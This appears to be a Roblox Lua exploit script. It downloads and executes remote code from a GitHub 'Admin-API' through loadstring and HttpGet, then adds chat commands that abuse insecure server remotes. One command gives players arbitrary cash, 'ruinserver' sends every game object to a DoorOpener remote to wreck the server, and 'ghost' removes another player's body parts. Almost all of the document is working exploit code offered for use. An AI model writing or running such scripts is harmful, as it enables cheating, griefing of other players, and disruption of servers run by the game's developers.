game:GetService("ReplicatedStorage").ChangeTeam:InvokeServer(' ')
local AdminAPI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Teemsploit/Admin-API/main/api.lua"))()
AdminAPI.Prefix = ";"
AdminAPI.CreateChatHook()

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

AdminAPI.CreateCommand("money", {}, function(args, speaker)
    local players = AdminAPI.GetPlayer(args[1], speaker)
    for _, v in pairs(players) do
        local Target = Players:FindFirstChild(v)
        if Target then
            local a = {
                [1] = false,
                [2] = (AdminAPI.IsNumber(args[2]) and args[2]) or 0,
                [3] = "Cash",
                [4] = Target
            }
            ReplicatedStorage.MoneyRequest:FireServer(unpack(a))
        end
    end
end)

AdminAPI.CreateCommand("ruinserver", {}, function(args, speaker)
        for _, GameFucked in pairs(game:GetDescendants()) do
	game.ReplicatedStorage.DoorOpener:FireServer(GameFucked)
end
end)
AdminAPI.CreateCommand("ghost", {}, function(args, speaker)
local players = AdminAPI.GetPlayer(args[1], speaker)
    for _, v in pairs(players) do
        local Target = Players:FindFirstChild(v)
        if Target then
Character = Target.Character
Torso = Character["Torso"]
Head = Character["Head"]
RightArm = Character["Right Arm"]
LeftArm = Character["Left Arm"]
RightLeg = Character["Right Leg"]
LeftLeg = Character["Left Leg"]
game:GetService("ReplicatedStorage").DoorOpener:FireServer(Torso)
wait()
game:GetService("ReplicatedStorage").DoorOpener:FireServer(Head)
wait()
game:GetService("ReplicatedStorage").DoorOpener:FireServer(RightArm)
wait()
game:GetService("ReplicatedStorage").DoorOpener:FireServer(LeftArm)
wait()
game:GetService("ReplicatedStorage").DoorOpener:FireServer(RightLeg)
wait()
game:GetService("ReplicatedStorage").DoorOpener:FireServer(LeftLeg)
end
end
end)
